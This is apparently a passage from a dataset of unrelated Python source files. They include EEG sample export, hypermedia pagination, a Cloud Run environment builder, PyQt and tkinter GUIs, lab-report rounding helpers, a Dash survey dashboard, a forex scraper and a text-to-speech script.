\"001.edf\"\n    edf = Edf(path)\n    sampler = BaseSampler(edf.k_complex_time, 4000)\n    normalizer = BaseNormalizer()\n    workflow = Workflow(edf).set_sampler(sampler).set_normalizer(normalizer)\n    workflow.export_all_channel_sample(\"LabelData/postive\")\n\ndef export_standard_train_data(standard_time_length=1500):\n    path = \"001.edf\"\n    edf = Edf(path)\n    normalizer = BaseNormalizer()\n    sampler = BaseSampler(edf.k_complex_time, standard_time_length)\n    channels_sampler = sampler.sample_multi_channel([edf.channel_C3, edf.channel_F4, edf.channel_C3, edf.channel_C4], channel_first=False)\n    new_ample = BaseSampler.transpose_matrix([normalizer.normalize_list_with_same_mid(tmp) for tmp in channels_sampler])\n    # TODO \uff081\uff091500\u7684\u6837\u672c\u4fdd\u5b58\uff1b\uff082\uff094000\u8303\u56f4\u7684\u6837\u672c\u753b\u56fe\uff0c\u540c1500\u6837\u672c\u7684\u4e2d\u5fc3\u70b9\uff1b\uff083\uff09\u8d1f\u91c7\u6837\n    \n    \n\n    t = 0\n\nexport_standard_train_data()\n# print(plt.rcParams[\"figure.figsize\"])\n",
    "#!/usr/bin/env python3\n\"\"\"\nDeletion-resilient hypermedia pagination\n\"\"\"\n\nimport csv\nimport math\nfrom typing import List, Dict\n\n\nclass Server:\n    \"\"\"Server class to paginate a database of popular baby names.\n    \"\"\"\n    DATA_FILE = \"Popular_Baby_Names.csv\"\n\n    def __init__(self):\n        self.__dataset = None\n        self.__indexed_dataset = None\n\n    def dataset(self) -> List[List]:\n        \"\"\"Cached dataset\n        \"\"\"\n        if self.__dataset is None:\n            with open(self.DATA_FILE) as f:\n                reader = csv.reader(f)\n                dataset = [row for row in reader]\n            self.__dataset = dataset[1:]\n\n        return self.__dataset\n\n    def indexed_dataset(self) -> Dict[int, List]:\n        \"\"\"Dataset indexed by sorting position, starting at 0\n        \"\"\"\n        if self.__indexed_dataset is None:\n            dataset = self.dataset()\n            truncated_dataset = dataset[:1000]\n            self.__indexed_dataset = {\n                i: dataset[i] for i in range(len(dataset))\n            }\n        return self.__indexed_dataset\n\n    def get_hyper_index(self, index: int = None, page_size: int = 10) -> Dict:\n        \"\"\"\n        Deletion resilient hypermedia pagination\n        \"\"\"\n        dataset = self.indexed_dataset()\n        assert type(index) is int and index in range(len(dataset))\n\n        data = []\n        start, end = index, index + page_size\n\n        while start < end:\n            if start in dataset.keys():\n                data.append(dataset[start])\n            else:\n                end += 1\n            start += 1\n\n        return {\n                \"index\": index,\n                \"data\": data,\n                \"page_size\": len(data),\n                \"next_index\": end\n                }\n",
    "from typing import List\nfrom time import sleep\nfrom requests import get\n\nfrom google.cloud.firestore_v1.document import DocumentReference\nfrom google.protobuf.duration_pb2 import Duration\nfrom google.cloud.run_v2 import JobsClient\nfrom google.cloud.run_v2.types import (\n    Job,\n    ExecutionTemplate,\n    TaskTemplate,\n    Container,\n    EnvVar,\n    ResourceRequirements,\n)\n\nfrom main_service import PROJECT_ID\n\n\nENV_BUILDER_CODE = \"\"\"\nimport tarfile\nimport subprocess\nimport tempfile\nimport os\nimport sys\n\nfrom google.cloud import storage\nfrom google.cloud import firestore\n\nPROJECT_ID = os.environ[\"GCP_PROJECT\"]\nJOB_ID = os.environ[\"BURLA_JOB_ID\"]\nBURLA_JOBS_BUCKET = \"burla-jobs\" if PROJECT_ID == \"burla-test\" else \"burla-jobs-prod\"\n\njob_ref = firestore.Client(project=PROJECT_ID).collection(\"jobs\").document(JOB_ID)\n\npkgs_formatted = []\nfor pkg in job_ref.get().to_dict()[\"env\"][\"packages\"]:\n    if pkg.get(\"version\"):\n        pkgs_formatted.append(f\"{pkg['name']}=={pkg['version']}\")\n    else:\n        pkgs_formatted.append(pkg[\"name\"])\n\ntemp_dir = tempfile.mkdtemp()\ncommand = [\n    sys.executable,\n    \"-m\",\n    \"pip\",\n    \"install\",\n    *pkgs_formatted,\n    \"--target\",\n    temp_dir,\n    \"--use-deprecated\",\n    \"legacy-resolver\"\n]\nresult = subprocess.run(command, stderr=subprocess.PIPE)\nprint(\"DONE EXECUTING PIP INSTALL COMMAND\")\nif result.returncode != 0:\n    job_ref.update({\"env.install_error\": result.stderr.decode()})\n    sys.exit(0)\n\nprint(\"TARRING\")\ntar_path = tempfile.mktemp(suffix=\".tar.gz\")\nwith tarfile.open(tar_path, \"w:gz\") as tar:\n    tar.add(temp_dir, arcname=os.path.sep)\nprint(\"DONE TARRING\")\n\nprint(\"UPLOADING\")\nbucket_name = BURLA_JOBS_BUCKET\nblob_name = f\"{JOB_ID}/env.tar.gz\"\nstorage_client = storage.Client()\nbucket = storage_client.get_bucket(bucket_name)\nblob = bucket.blob(blob_name)\nblob.upload_from_filename(tar_path)\nprint(\"DONE UPLOADING\")\n\nuri = f\"gs://{BURLA_JOBS_BUCKET}/{blob_name}\"\njob_ref.update({\"env.uri\": uri})\nprint(f\"Successfully built environment at: {uri}\")\n\"\"\"\nENV_BUILDER_SCRIPT = 'python -c \"{}\"'.format(ENV_BUILDER_CODE.replace('\"', r\"\\\"\"))\nSWAP_PACKAGES = {\"psycopg2\": \"psycopg2-binary\"}\n\n\ndef start_building_environment(\n    packages: List[dict], job_ref: DocumentReference, job_id: str, image: str\n):\n    # clean packages list\n    is_pip_pkg = lambda pkg: get(f\"https://pypi.org/pypi/{pkg}/json\").status_code != 404\n    pip_packages = [pkg for pkg in packages if is_pip_pkg(pkg[\"name\"])]\n    for pkg in pip_packages:\n        pkg[\"name\"] = SWAP_PACKAGES.get(pkg[\"name\"], pkg[\"name\"])\n    env = {\"env.is_copied_from_client\": True, \"env.packages\": packages, \"env.image\": image}\n    job_ref.update(env)\n\n    # start google cloud run job\n    container = Container(\n        image=image,\n        command=[\"/bin/sh\", \"-c\", ENV_BUILDER_SCRIPT],\n        env=[\n            EnvVar(name=\"BURLA_JOB_ID\", value=job_id),\n            EnvVar(name=\"GCP_PROJECT\", value=PROJECT_ID),\n        ],\n        resources=ResourceRequirements(limits={\"memory\": \"32Gi\", \"cpu\": \"8\"}),\n    )\n    timeout = Duration(seconds=3600)  # 1hr\n    task_template = TaskTemplate(max_retries=1, containers=[container], timeout=timeout)\n    job = Job(template=ExecutionTemplate(template=task_template))\n    client = JobsClient()\n\n    cloud_run_job_id = f\"env-build-{job_id}\"\n    parent_resource = f\"projects/{PROJECT_ID}/locations/us-central1\"\n    cloud_run_job_name = f\"{parent_resource}/jobs/{cloud_run_job_id}\"\n    client.create_job(parent=parent_resource, job=job, job_id=cloud_run_job_id)\n\n    while client.get_job(name=cloud_run_job_name).reconciling:\n        sleep(1)\n    client.run_job(name=cloud_run_job_name)\n",
    "from PyQt5.QtCore import QThread, pyqtSignal, QUrl\nfrom PyQt5 import QtCore, QtGui, QtWidgets\nfrom PyQt5.QtGui import QIcon, QIntValidator, QDesktopServices\nfrom PIL import Image\nfrom io import BytesIO\nimport os\nimport sys\n\ndef resource_path(relative_path):\n    try:\n        base_path = sys._MEIPASS\n    except Exception:\n        base_path = os.path.abspath(\".\")\n    return os.path.join(base_path, relative_path)\n\n# Overrides Drag Drop Events to cancel mouse cursor forbidden\nclass DropLabel(QtWidgets.QLabel):\n    def __init__(self, parent=None):\n        super(DropLabel, self).__init__(parent)\n        self.setAcceptDrops(True)\n\n    def dragEnterEvent(self, event):\n        event.acceptProposedAction()\n\n    def dragMoveEvent(self, event):\n        event.acceptProposedAction()\n\nclass CustomInstructionsDialog(QtWidgets.QDialog):\n    def __init__(self, instructions_text, parent=None):\n        super(CustomInstructionsDialog, self).__init__(parent)\n        self.setWindowFlags(QtCore.Qt.FramelessWindowHint | QtCore.Qt.Dialog)\n        self.init_ui(instructions_text)\n\n    def init_ui(self, instructions_text):\n        layout = QtWidgets.QVBoxLayout()\n        label = QtWidgets.QLabel(instructions_text)\n        label.setWordWrap(True)\n\n        label.setStyleSheet(\"color: white;\")\n        font = QtGui.QFont()\n        font.setFamily(\"Segoe UI\")\n        font.setPointSize(12)\n        label.setFont(font)\n        layout.addWidget(label)\n\n        close_button = QtWidgets.QPushButton()\n        close_button.setIcon(QtGui.QIcon(resource_path(\"assets/closeicon2.svg\")))\n        close_button.setIconSize(QtCore.QSize(24, 24))\n        close_button.setFixedSize(QtCore.QSize(31, 31))\n        close_button.clicked.connect(self.close)\n        close_button.setStyleSheet(\"\"\"\n        QPushButton {\n            background-color: rgb(45, 45, 45);\n            border: none;\n        }\n\n        QPushButton:hover {\n            background-color: rgb(35, 35, 35);\n        }\n        \"\"\")\n\n        close_layout = QtWidgets.QHBoxLayout()\n        close_layout.addStretch(1)\n        close_layout.addWidget(close_button)\n        layout.addLayout(close_layout)\n        self.setLayout(layout)\n        self.setStyleSheet(\"\"\"background: rgb(45, 45, 45);\n        border: 1px solid transparent;\n        border-top-width: 0.5px;\n        border-bottom-width: 0.5px;\n        border-left-width: 0.5px;\n        border-right-width: 0.5px;\n        border-color: rgb(220, 220, 220, 0.5);\n        \"\"\")\n        self.setGeometry(300, 300, 400, 500)  # Example geometry\n        self.center()\n\n    def center(self):\n        screen_geometry = QtWidgets.QDesktopWidget().screenGeometry()\n        center_point = screen_geometry.center()\n        self.move(center_point - self.rect().center())\n\nclass nexus_ic_2(object):\n    def __init__(self):\n        self.processingThread = QThread()\n        self.page_2 = None\n        self.progressBar = None\n        self.statusbar = None\n        self.button1 = None\n        self.oldPos = None\n        self.clearbutton = None\n        self.button2 = None\n        self.maintainAspectRatioCheckBox = None\n        self.resizeModePercentage = None\n        self.widthLineEdit = None\n        self.heightLineEdit = None\n        self.textdisplay2 = None\n        self.textdisplay1 = None\n        self.num_images_label = None\n        self.instructionsButton = None\n        self.page1 = None\n        self.stackedWidget = None\n        self.horizontalLayout = None\n        self.centralwidget = None\n        self.originalAspectRatio = None\n        self.imageProcessingThread = None\n\n    def setup_ui(self, MainWindow):\n        MainWindow.setObjectName(\"MainWindow\")\n        MainWindow.resize(431, 500)\n        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)\n        sizePolicy.setHorizontalStretch(0)\n        sizePolicy.setVerticalStretch(0)\n        sizePolicy.setHeightForWidth(MainWindow.sizePolicy().hasHeightForWidth())\n        MainWindow.setSizePolicy(sizePolicy)\n        MainWindow.setMinimumSize(QtCore.QSize(431, 500))\n        MainWindow.setMaximumSize(QtCore.QSize(431, 500))\n        MainWindow.setStyleSheet(\"\"\"\n                QMainWindow {\n        background: rgb(45, 45, 45);\n        border: 1px solid transparent;\n        border-top-width: 0.5px;\n        border-bottom-width: 0.5px;\n        border-left-width: 0.5px;\n        border-right-width: 0.5px;\n        border-color: rgb(220, 220, 220, 0.5);\n    }\n    QStatusBar {\n        border: 1px solid transparent;\n        border-top: none;\n        border-bottom-width: 0.5px; \n        border-left-width: 0.5px; \n        border-right-width: 0.5px; \n        border-color: rgb(220, 220, 220, 0.5);\n    }\n            \"\"\")\n        MainWindow.setWindowFlags(QtCore.Qt.FramelessWindowHint)\n        # endregion\n        self.oldPos = None\n\n        def mousePressEvent(event):\n            if event.button() == QtCore.Qt.LeftButton:\n                self.oldPos = event.globalPos()\n\n        def mouseMoveEvent(event):\n            if",
    "\nimport numpy as np\nimport sympy as sym\nfrom Helpers import identifier, roundUP\nimport math\n\n\ndef roundSci(messwert, fehler):\n    if fehler == 0:\n        print('Fehler von 0, macht keinen Sinn')\n        return None\n    fehlerStr = str(fehler)\n    k = -127\n    p = fehlerStr.find('.')\n    if p != -1:\n        for i in range(0, len(fehlerStr)):\n            if fehlerStr[i] in [\"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]:\n                if i < p:\n                    k = i - p + 1\n                else:\n                    k = i - p\n                break\n            if fehlerStr[i] in ['1', '2']:\n                if i+1 < p:\n                    k = i - p + 2\n                else:\n                    k = i - p + 1\n                    if k == 0:\n                        k = 1\n                break\n        e = fehlerStr.find('e')\n        if e != -1:\n            k -= int(fehlerStr[e+1:len(fehlerStr)])\n    else:\n        #kein komma\n        e = fehlerStr.find('e')\n        if e == -1:\n            for i in range(len(fehlerStr)):\n                if fehlerStr[i] in ['3', '4', '5', '6', '7', '8', '9']:\n                    k = i - len(fehlerStr) + 1\n                    break\n                if fehlerStr[i] in ['1', '2']:\n                    k = i - len(fehlerStr) + 2\n                    break\n        else:\n            for i in range(e):\n                if fehlerStr[i] in ['3', '4 ', '5', '6', '7', '8', '9']:\n                    k = i - e + 1\n                    break\n                if fehlerStr[i] in ['1', '2']:\n                    k = i - e + 2\n                    break\n            k -= int(fehlerStr[e+1:len(fehlerStr)])\n    #eigentliches runden, mit ermitteltem k\n    fehler *= math.pow(10, k)\n    fehler = roundUP(fehler)\n    fehler /= math.pow(10, k)\n    messwert *= math.pow(10, k)\n    messwert = round(messwert)\n    messwert /= math.pow(10, k)\n    anzahlStellen = str(int(max([0, k])))\n    fehlerFormat = \".\" + anzahlStellen + \"f\"\n    fehler  = format(fehler, fehlerFormat)\n\n    messwertFormat = \".\" + anzahlStellen + \"f\"\n    messwert  = format(messwert, messwertFormat)\n    return [messwert, fehler, k]\n\n\ndef latexTable(*spalten):\n    shp = len(spalten)\n    if shp == 0:\n        print(\"Keine Matrix erhalten, len spalten = 0\")\n        return None\n    maxIndex = 0\n    for i in range(shp):\n        if len(spalten[i]) > maxIndex:\n            maxIndex = i\n\n    maxLength = len(spalten[maxIndex])\n    result = 'copy below' + '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \\|/' + '\\n' + '\\n'\n    result += r'\\begin{table}[H]' + '\\n'\n    result += '\\centering' + '\\n'\n    result += r'\\label{LABEL}' + '\\n'\n    result += r'\\caption{CAPTION}' + '\\n'\n\n    result += r'\\begin{tabular}{|'\n    for i in range(shp):\n        result += r'c|'\n    result += '}' + '\\n' + '\\hline' + '\\n' + '\\n'\n    for i in range(shp - 1):\n        result += 'Bezeichnung' + str(i+1) + ' & '\n    result += 'Bezeichnung' + str(shp) + r'\\\\'\n    result += '\\n' + r'\\hline' + '\\n'\n    for i in range(maxLength):\n        result += '\\n'\n        for j in range(shp - 1):\n            if i < len(spalten[j]):\n                result += '$' + spalten[j][i] + '$' + ' & '\n            else:\n                result += '&'\n        result += '$' + spalten[shp-1][i] + '$' + r'\\\\'\n\n    result += '\\n' + '\\n' + '\\hline'\n    result += '\\n' + r'\\end{tabular}'\n    result += '\\n' + '\\end{table}' + '\\n' + '\\n' + r'- - - - - - - - - - - - - - - - - - - - - - - /|' + r'\\ '\n    print(result)\n\n\ndef roundCol(vector, errorVector, unitString='', factor=0):\n    if vector.size != errorVector.size or vector.size == 0 or errorVector.size == 0:\n        print('L\u00e4ngen ungleich odewr L\u00e4ngen sind 0')\n        return None\n    length = len(vector)\n    result = []\n    for i in range(length):\n        rounded = roundSci(vector[i], errorVector[i])\n        if factor == 0:\n            result.append('(' + rounded[0] + ' \\pm ' + rounded[1] + ')' + '\\,' + '\\mathrm{' + unitString + '}')\n        else:\n            value = float(rounded[0])*math.pow(10, factor)\n            valueErrorFormat = '.' + str(max([0, int(rounded[2]) - factor])) + 'f'\n            value = format(value, valueErrorFormat)\n            error = float(rounded[1])*math.pow(10, factor)\n            error = format(error, valueErrorFormat)\n            result.append('(' + value + ' \\pm ' + error + ')' + '\\,' + '\\mathrm{' + unitString + '}')\n    return result\n\n\ndef RC(vector, errorVector, unitString='', factor=0):\n    return roundCol(vector, errorVector, unitString, factor)\n\n\ndef nameCol(n):\n    result = []\n    for i in range(n):\n        result.append('N_{\\mathrm{' + str(i) + '}}')\n    return result\n\n\ndef indexCol(n):\n    result = []\n    for i in range(n):\n        result.append(str(i))\n    return result\n\n\ndef unitCol(vector, unitString='', factor=0):\n    result = []\n    for i in range(vector.size):\n        result.append(str(vector[i]*math.pow(10, factor)) + '\\,' + '\\mathrm{' + unitString + '}')\n    return result\n\n\n\n\n",
    "from dash import Dash, html, dcc, callback, Output, Input, dash_table\nimport dash_bootstrap_components as dbc\nimport plotly.express as px\nimport plotly.graph_objects as go\nimport pandas as pd\n\n\n\n# Inicializaci\u00f3n de la app\napp = Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\nserver= app.server\n\n# Lectura de archivos CSV\nedades_participantes= pd.read_csv(\"datos/edades_participantes.csv\", sep=',')\n\nprob_de_vivir_sarm= pd.read_csv(\"datos/prob_de_vivir_sarm.csv\", sep=',')\n\nresp_sueldo= pd.read_csv(\"datos/sueldo.csv\", sep=',')\n\ndf_int_soc= pd.read_csv(\"datos/df_int_soc.csv\", sep=',')\n\nddf= pd.read_csv(\"datos/datos_encuestados.csv\", sep=',')\nddff= ddf.head(6)\n\n\n# Iniciar ploteo de figuras\n# Figura n\u00b0 1 gr\u00e1fico de barras\nfig_edades = px.bar(edades_participantes, x=edades_participantes['Rango de edades'], y=edades_participantes['N\u00famero de participantes'], \n                    color='Rango de edades'\n                    )\nfig_edades.update_layout(title=dict(text='N\u00fameros de participantes seg\u00fan su edad'),\n                                    plot_bgcolor='lightslategrey',\n                                    paper_bgcolor='lightslategrey',\n                                    font_color='white',\n                        )\n\n# Figura n\u00b0 2 gr\u00e1fico de barras\nfig_num_part = px.bar(resp_sueldo, x=resp_sueldo['Porcentajes respuestas'], y=resp_sueldo['Respuesta sobre el sueldo'], \n                                     color='Porcentajes respuestas'\n                      )\nfig_num_part.update_layout(title=dict(text='Promedio ingresos mensuales'),\n                                      plot_bgcolor='lightslategrey',\n                                      paper_bgcolor='lightslategrey',\n                                      font_color='white'\n                            )\n\n# Figura n\u00b0 3 gr\u00e1fico circular\nfig_int_soc = go.Figure(data=[go.Pie(labels=df_int_soc['Intenci\u00f3n social'], values=df_int_soc['Respuestas'], hole=.3,\n                                     pull=[0, 0, 0, 0, 0, 0.09])\n                              ]\n                        )\nfig_int_soc.update_layout(title_text=\"Intenci\u00f3n social c\u00f3mo representante p\u00fablico\", \n                          uniformtext_minsize=9, \n                          uniformtext_mode='hide',\n                          legend=dict(\n                                      x=0.9,  \n                                      y=1.2,  \n                                      orientation='h'\n                                     )\n                          )\n\n# Figura n\u00b0 4 gr\u00e1fico de dispersi\u00f3n\nfig_estudios = px.scatter(ddf, x=ddf['Nivel de estudios'], y=ddf['Profesi\u00f3n'], color='Nivel de estudios',\n                          )\nfig_estudios.update_layout(title=dict(text='Profesi\u00f3n vs Estudios'),\n                                      plot_bgcolor='lightslategrey',\n                                      paper_bgcolor='lightslategrey',\n                                      font_color='white',\n                                      font_size=10,\n                            legend=dict(\n                                        x=1.0,  \n                                        y=1.2, \n                                        orientation='v' \n                                    ),\n                            yaxis_title_font=dict(size=12),\n                            xaxis_title_font=dict(size=12)\n                            )\n\n# Dise\u00f1o de la aplicaci\u00f3n (Interfaz)\napp.layout= dbc.Container([\n                           dbc.Row([    \n                                    dbc.Col(children=[ \n                                                       html.Br(),\n\n                                                       html.H1(children=['Estudio econ\u00f3mico en Sarmiento (Informe final)'],                                         \n                                                               style={'textAlign':'left'}),\n                                                       html.Hr(),            \n                                \n                                                       html.P(children=[\"\"\"Este informe resume los hallazgos del estudio econ\u00f3mico realizado en la localidad de Sarmiento, pueblo ubicado en el departamento Totoral, \n                                                                        provincia de C\u00f3rdoba. En esta investigaci\u00f3n se analizaron las respuestas a 15 preguntas de opci\u00f3n m\u00faltiple choise. \n                                                                        En el estudio participaron 105 personas aportando una mirada critica sobre las condiciones socioecon\u00f3mica en la localidad. Es inherente tener en cuenta\n                                                                        qu\u00e9 esta investigaci\u00f3n permite evaluar las condiciones de la poblaci\u00f3n, y aun m\u00e1s importante, permite identificar las necesidades de cada sector o \u00e1rea, \n                                                                        mejorar la toma de decisiones, el desarrollo y la innovaci\u00f3n de la Localidad.\"\"\"],                       ",
    "from bs4 import BeautifulSoup\nimport requests\nimport gspread\nimport os\nimport datetime\nimport mysql.connector\nfrom dotenv import load_dotenv\n\n\nload_dotenv('.env')\n\nnow = datetime.datetime.now().strftime(\"%Y/%m/%d %H:%M:%S\")\n\n\n# Scrayping\nres = requests.get('https://nikkeiyosoku.com/usdjpy/forecast/')\nsoup = BeautifulSoup(res.text, 'html.parser')\n\ntag_objs = soup.find_all('p', class_='forecast-today-txt')\ntag_list_string = [x.string for x in tag_objs]\n\n\n# Write in Sheet\ndir_path = os.path.dirname(__file__)\ngc = gspread.oauth(\n    credentials_filename = os.path.join(dir_path, \"client_secret.json\"),\n    authorized_user_filename = os.path.join(dir_path, \"authorized_user.json\")\n)\n\ntarget_file = gc.open_by_key(os.getenv('FOREST_SHEET_API_KEY'))\ntarget_sheet = target_file.get_worksheet(0)\n\nmin_expected = tag_list_string[0].split()[0]\nmax_expected = tag_list_string[0].split()[2]\nai_expected = tag_list_string[1].replace(\"\\xa0\", '')\n\nscrayping_data = [min_expected, max_expected, ai_expected, now]\n\ntarget_sheet.append_row(scrayping_data, value_input_option='USER_ENTERED')\n\n\n# Insert to DB\nmydb = mysql.connector.connect(\n    host = \"localhost\",\n    user = os.getenv('DB_USER'),\n    password = os.getenv('DB_PASSWORD'),\n    database = \"forest_database\",\n)\n\nmycursor = mydb.cursor()\nsql = \"INSERT into forestapi_forestdollaryen (min_forecast, max_forecast, ai_forecast, datetime_created) VALUES (%s, %s, %s, %s)\"\nmycursor.execute(sql, scrayping_data)\nmydb.commit()\n",
    "# Importar as bibliotecas a usar\r\nimport tkinter as tk\r\nfrom tkinter import messagebox\r\nfrom tkinter.filedialog import asksaveasfilename\r\n\r\n# Fun\u00e7\u00e3o copiar\r\ndef copiar_codigo():\r\n    # Limpa o conte\u00fado atual da \u00e1rea de transfer\u00eancia\r\n    janela.clipboard_clear()\r\n    \r\n    # Pega todos os itens da Listbox Lcodico\r\n    itens = Lcodico.get(0, tk.END)\r\n    \r\n    # Se a lista estiver vazia, exibe uma mensagem de aviso e retorna\r\n    if not itens:\r\n        messagebox.showwarning(\"Aviso\", \"Nenhum c\u00f3digo para copiar.\")\r\n        return\r\n    \r\n    # Concatena todos os itens em uma \u00fanica string\r\n    codigo = \"\\n\".join(itens)\r\n    \r\n    # Adiciona o c\u00f3digo \u00e0 \u00e1rea de transfer\u00eancia\r\n    janela.clipboard_append(codigo)\r\n    \r\n    # Exibe uma mensagem de sucesso\r\n    messagebox.showinfo(\"Sucesso\", \"C\u00f3digo copiado para a \u00e1rea de transfer\u00eancia.\")\r\n\r\n# Fun\u00e7\u00e3o atualizar cor\r\ndef atualiza_cor(*args):\r\n    # Pega os valores atuais dos sliders\r\n    r = Svermelho.get()\r\n    g = Sverde.get()\r\n    b = SAzul.get()\r\n    \r\n    # Converte os valores para uma string hexadecimal\r\n    cor_hex = f'#{r:02x}{g:02x}{b:02x}'\r\n    \r\n    # Atualiza o fundo de LCor com a nova cor\r\n    LCor.config(bg=cor_hex)\r\n    \r\n    # Atualiza o campo EHexa com o valor hexadecimal da cor\r\n    EHexa.delete(0, tk.END)\r\n    EHexa.insert(0, cor_hex)\r\n\r\n# Fun\u00e7\u00e3o carregar cor\r\ndef carregar_cor():\r\n    # Pega os valores dos campos Enome e EHexa\r\n    nome = Enome.get()\r\n    hexa = EHexa.get()\r\n    \r\n    # Verifica se os campos n\u00e3o est\u00e3o vazios\r\n    if nome and hexa:\r\n        # Adiciona os valores \u00e0 Listbox Lcodico\r\n        Lcodico.insert(tk.END, f'{nome} {hexa}')\r\n        \r\n        # Opcional: limpa os campos ap\u00f3s adicionar\r\n        Enome.delete(0, tk.END)\r\n        EHexa.delete(0, tk.END)\r\n    else:\r\n        messagebox.showinfo('Informa\u00e7\u00e3o',\"Nome da cor ou valor hexadecimal est\u00e1 vazio!\")\r\n\r\n# Fun\u00e7\u00e3o salvar cores\r\ndef salvar_cores():\r\n    # Abre a janela de di\u00e1logo para o usu\u00e1rio escolher onde salvar o arquivo\r\n    filepath = asksaveasfilename(defaultextension=\".txt\", filetypes=[(\"Text files\", \"*.txt\"), (\"All files\", \"*.*\")])\r\n    if not filepath:  # Se o usu\u00e1rio cancelar, retorna sem fazer nada\r\n        return\r\n    with open(filepath, 'w') as arquivo:\r\n        for item in Lcodico.get(0, tk.END):\r\n            arquivo.write(item + '\\n')\r\n    messagebox.showinfo(\"Cores\",f\"Cores salvas com sucesso em {filepath}!\")\r\n\r\n# Fun\u00e7\u00e3o limpar campos\r\ndef limpar_campos():\r\n    # Limpa o conte\u00fado de Lcor\r\n    LCor.config(bg='#000000')\r\n    \r\n    # Define os valores dos sliders para zero\r\n    Svermelho.set(0)\r\n    Sverde.set(0)\r\n    SAzul.set(0)\r\n    \r\n    # Limpa os campos Enome e EHexa\r\n    Enome.delete(0, tk.END)\r\n    EHexa.delete(0, tk.END)\r\n    \r\n    # Limpa o conte\u00fado de Lcodico\r\n    Lcodico.delete(0, tk.END)    \r\n\r\n# Definir cores a usar neste projeto\r\nco0 ='#ffffff'  # cor branco para fundo\r\nco1 = '#000000' # cor preto para painel\r\nco2 = '#fffbf5' # amarelo claro entrys\r\nco3 = '#f8f9f7' # azul claro para bot\u00f5es \r\nco4 = '#f8f8ee' # amarelo claro para ListBox\r\n\r\n# Configurar a janela\r\njanela = tk.Tk()\r\njanela.geometry('650x450+100+100')\r\njanela.resizable(False, False)\r\njanela.title('Selector de Cores Hexadecimal Dev Joel 2024 Portugal \u00a9')\r\njanela.configure(bg=co0)\r\n\r\n# Criar o label para exibir a cor preta\r\nLCor = tk.Label(janela, bg=co1, width=30, height=15)\r\nLCor.place(x=5, y=0)\r\n\r\n# Criar o label controle Vermelho, Verde, Azul\r\nVermelho = tk.Label(janela, text='Vermelho', font=('arial 14'), bg=co0)\r\nVermelho.place(x=260, y=0)\r\nVerde = tk.Label(janela, text='Verde', font=('arial 14'), bg=co0)\r\nVerde.place(x=260, y=75)\r\nAzul = tk.Label(janela, text='Azul', font=('arial 14'), bg=co0)\r\nAzul.place(x=260, y=155)\r\n\r\n# Criar o Slider Vermelho, Verde, Azul\r\nSvermelho = tk.Scale(janela, orient=tk.HORIZONTAL, length=365, bg=co0, from_=0, to=255, command=atualiza_cor)\r\nSvermelho.place(x=260, y=30)\r\nSverde = tk.Scale(janela, orient=tk.HORIZONTAL, length=365, bg=co0, from_=0, to=255, command=atualiza_cor)\r\nSverde.place(x=260, y=105)\r\nSAzul = tk.Scale(janela, orient=tk.HORIZONTAL, length=365, bg=co0, from_=0, to=255, command=atualiza_cor)\r\nSAzul.place(x=260, y=185)\r\n\r\n# Criar as entrys Referencia e codigo\r\nEnome = tk.Entry(janela, bg=co2, width=10, font=('arial 14'))\r\nEnome.place(x=5, y=265)\r\nEHexa = tk.Entry(janela, bg=co2, font=('arial 14'), width=10)\r\nEHexa.place(x=125, y=265)\r\n\r\n# Criar os Bot\u00f5es\r\nBtnCarregar = tk.Button(janela, text='Carregar codigo', font=('arial 12'), relief=tk.RAISED, overrelief=tk.RIDGE, command=carregar_cor, bg=co3)\r\nBtnCarregar.place(x=320, y=305)\r\nBtnGuardar = tk.Button(janela, text='Guardar', font=('arial 12'), relief=tk.RAISED, overrelief=tk.RIDGE, command=salvar_cores, bg=co3)\r\nBtnGuardar.place(x=5, y=305)\r\nBtnCopiar = tk.Button(janela, text='Copiar codigo', font=('arial 12'), relief=tk.RAISED, overrelief=tk.RIDGE, command=copiar_codigo, bg=co3)\r\nBtnCopiar.place(x=100, y=305)\r\nBtnLimpar = tk.Button(janela, text='Limpar', font=('arial 12'), relief=tk.RAISED, o",
    "import os\nimport math\nimport shutil\nimport re\nimport subprocess\nfrom moviepy.editor import *\nfrom gtts import gTTS\nfrom pydub import AudioSegment\nimport edge_tts\n\ndef text_to_voice():\n    try:\n        shutil.rmtree('./texttovoice')\n        #os.mkdir('./tts')\n    except:\n        pass\n\n    voice = []\n    content = open('../content.txt').read()\n\n    contents = re.split(r'[\u3002\uff01\uff1f\uff1f, \uff0c]', content)\n\n    for content in contents:\n        content = content.replace('\"', \"'\").strip()\n        if not len(content):\n            continue\n        # filename = gtts(content)\n        filename = _edge_tts(content)\n        voice.append(filename)\n    return voice\n\ndef gtts(content):\n    filename = '../tts/%s.mp3' % content\n    # \u8f6c\u8bed\u97f3\n    g_tts = gTTS(content, lang='zh-CN')\n    g_tts.save(filename)\n\n    # \u8c03\u6574\u8bed\u901f \u4e3a 1.0 \u500d\u901f\n    sound = AudioSegment.from_mp3(filename)\n    duration = int(sound.duration_seconds)\n    update_speed_filename = '../tts/%s_duration_%f.mp3' % (content, math.ceil(duration * 0.85))\n    cmd = \"ffmpeg -y -i %s -filter_complex \\\"atempo=tempo=%s\\\" %s\" % (filename, '1.0', update_speed_filename)\n    res = subprocess.call(cmd, shell=True)\n    if res == 0:\n        os.remove(filename)\n    return update_speed_filename\n\n\ndef _edge_tts(content):\n\n    filename = '../tts/%s.mp3' % content\n    cmd = 'edge-tts --voice zh-CN-YunxiNeural --text \"' + content + '\" --write-media %s' % filename\n    res = subprocess.call(cmd, shell=True)\n\n    sound = AudioSegment.from_mp3(filename)\n    duration = int(sound.duration_seconds)\n    update_name = '../tts/%s_duration_%f.mp3' % (content, duration)\n    os.rename(filename, update_name)\n    return update_name\n    pass\n\n\ndef get_all_files(path):\n    files = []\n    for root, dirs, filenames in os.walk(path):\n        for filename in filenames:\n            files.append(os.path.join(root, filename))\n    return files",
